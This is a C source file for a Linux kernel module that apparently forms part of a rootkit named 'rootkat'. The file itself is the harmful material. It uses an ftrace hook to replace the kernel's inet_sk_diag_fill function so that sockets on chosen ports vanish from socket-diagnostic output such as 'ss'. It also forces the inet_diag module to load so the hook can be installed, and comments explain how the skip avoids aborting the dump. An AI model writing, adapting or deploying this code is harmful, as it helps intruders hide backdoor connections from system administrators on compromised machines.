// SPDX-License-Identifier: MIT
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/netlink.h>
#include <linux/inet_diag.h>
#include <net/inet_connection_sock.h>
#include <net/sock.h>
#include "ftrace_hook.h"
#include "hidden_ports.h"
#include "hook_inet_sk_diag_fill.h"

#define TAG "rootkat/hook_inet_sk_diag_fill: "

static const char * const inet_sk_diag_fill_candidates[] = {
	"inet_sk_diag_fill", NULL,
};

typedef int (*inet_sk_diag_fill_t)(struct sock *sk,
                                   struct inet_connection_sock *icsk,
                                   struct sk_buff *skb,
                                   struct netlink_callback *cb,
                                   const struct inet_diag_req_v2 *req,
                                   u16 nlmsg_flags, bool net_admin);

static int rootkat_inet_sk_diag_fill(struct sock *sk,
                                     struct inet_connection_sock *icsk,
                                     struct sk_buff *skb,
                                     struct netlink_callback *cb,
                                     const struct inet_diag_req_v2 *req,
                                     u16 nlmsg_flags, bool net_admin);

static struct rootkat_hook hook_inet_sk_diag_fill = {
	.candidates  = inet_sk_diag_fill_candidates,
	.replacement = rootkat_inet_sk_diag_fill,
};

/*
 * Returning 0 without writing to skb signals the inet_diag iterator
 * "this socket was processed; advance" while the netlink response sees
 * no entry for it. Negative return values would abort the dump, so
 * never propagate a "skip" as an error.
 */
static int rootkat_inet_sk_diag_fill(struct sock *sk,
                                     struct inet_connection_sock *icsk,
                                     struct sk_buff *skb,
                                     struct netlink_callback *cb,
                                     const struct inet_diag_req_v2 *req,
                                     u16 nlmsg_flags, bool net_admin)
{
	inet_sk_diag_fill_t orig =
		(inet_sk_diag_fill_t)hook_inet_sk_diag_fill.original;

	if (sk && rootkat_is_port_hidden(sk->sk_num))
		return 0;

	return orig(sk, icsk, skb, cb, req, nlmsg_flags, net_admin);
}

int rootkat_hook_inet_sk_diag_fill_install(void)
{
	int rc;

	/* On Ubuntu, inet_diag is built as a module (CONFIG_INET_DIAG=m).
	 * It autoloads when /something/ opens a NETLINK_SOCK_DIAG socket
	 * (e.g. when `ss` runs). At our module_init time it's not loaded
	 * yet, so the symbol isn't in kallsyms. Trigger autoload first. */
	rc = request_module("inet_diag");
	if (rc)
		pr_debug(TAG "request_module(inet_diag) returned %d (continuing anyway)\n",
		        rc);

	return rootkat_hook_install(&hook_inet_sk_diag_fill);
}

void rootkat_hook_inet_sk_diag_fill_remove(void)
{
	rootkat_hook_remove(&hook_inet_sk_diag_fill);
}
